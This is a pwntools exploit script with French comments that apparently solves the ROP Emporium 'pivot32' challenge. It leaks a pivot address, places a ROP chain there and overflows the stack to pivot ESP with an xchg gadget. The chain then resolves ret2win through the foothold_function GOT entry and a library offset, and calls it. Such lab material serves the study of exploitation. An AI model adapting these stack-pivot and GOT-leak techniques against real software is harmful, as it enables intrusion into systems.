from pwn import *

# But de la ROP chain :
#
# 1) On écrit la vraie chaîne dans une zone leakée à l'exécution.
# 2) On déborde la stack (peu de place) juste pour poser un stack pivot
#    => (xchg eax, esp) fait pointer ESP sur la zone et la vraie chaîne s'exécute.
#
# ret2win n'est pas importé : on le résout via la GOT de foothold_function.
#   Appeler foothold_function -> sa GOT se remplit
#   Lire la GOT -> adresse réelle de foothold
#   (ret2win - foothold) -> adresse de ret2win
#   call ret2win

context.bits = 32
elf      = ELF("./pivot32")
libpivot = ELF("./libpivot32.so")

# --- usefulGadgets (objdump -d ./pivot32 | grep -A20 usefulGadgets) ---------
pop_eax     = p32(0x0804882c)   # pop eax ; ret
xchg        = p32(0x0804882e)   # xchg eax, esp ; ret 
mov_eax_eax = p32(0x08048830)   # mov eax, dword ptr [eax] ; ret   (déréférence la GOT)
add_eax_ebx = p32(0x08048833)   # add eax, ebx ; ret

# --- gadgets hors usefulGadgets ---------------------------------------------
pop_ebx  = p32(0x080484a9)      # pop ebx ; ret
call_eax = p32(0x080485f0)      # call eax

foothold_plt = elf.plt["foothold_function"]    # appel -> remplit la GOT
foothold_got = elf.got["foothold_function"]    # entrée GOT à lire
offset = libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]
# offset calculé direct depuis libpivot32.so (pas besoin de le relever à la main)

io = process("./pivot32")

# === 1) Leak de l'adresse de la zone pivotée ===============================
io.recvuntil(b"pivot: ")                  # "...a place to pivot: 0x..."
pivot_addr = int(io.recvline().strip(), 16)
log.success("pivot @ %#x" % pivot_addr)

# === 2) La vraie chaîne, écrite DANS la zone pivotée (1ère entrée) ==========
chain  = p32(foothold_plt)                # Appelle foothold_function -> remplit sa GOT
chain += pop_eax + p32(foothold_got)      # eax = &GOT[foothold]
chain += mov_eax_eax                      # eax = adresse réelle de foothold_function
chain += pop_ebx + p32(offset)            # ebx = (ret2win - foothold)
chain += add_eax_ebx                      # eax = adresse de ret2win
chain += call_eax                         # call ret2win  -> flag

io.sendlineafter(b"> ", chain)            # Première lecture (dans la zone pivotée)

# === 3) On pivote ESP sur la zone ===========
payload  = b"A" * 44                      # offset jusqu'à EIP (msf-pattern)
payload += pop_eax + p32(pivot_addr)      # eax = adresse de la zone pivotée
payload += xchg                           # xchg eax, esp -> ESP = pivot_addr -> la chaîne tourne

io.sendlineafter(b"> ", payload)          # 2ème lecture (la stack vulnérable)

io.interactive()
